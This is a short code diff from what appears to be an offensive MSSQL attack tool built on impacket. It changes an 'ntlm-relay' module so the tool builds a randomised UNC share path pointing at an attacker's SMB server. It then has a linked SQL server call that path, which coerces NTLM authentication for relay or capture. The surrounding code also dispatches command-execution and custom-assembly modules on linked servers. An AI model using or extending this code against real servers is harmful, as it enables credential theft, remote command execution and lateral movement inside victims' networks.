@@ -1,6 +1,8 @@
 import os
 from impacket import LOG
 
+import utilities
+
 
 def execute_module(options, mssql_client):
     link_server = options.link_server if options.link_server else mssql_client.state['local_hostname']
@@ -20,8 +22,9 @@ def execute_module(options, mssql_client):
                                              [options.command_execution_method, options.command],
                                              linked_server=link_server)
     elif options.module == 'ntlm-relay':
+        share = fr"\\{options.smb_server}\{utilities.generate_string()}\{utilities.generate_string()}"
         mssql_client.procedure_chain_builder(mssql_client.execute_procedure,
-                                             [options.relay_method, options.smb_server],
+                                             [options.relay_method, share],
                                              linked_server=link_server)
 
     elif options.module == 'custom-asm':
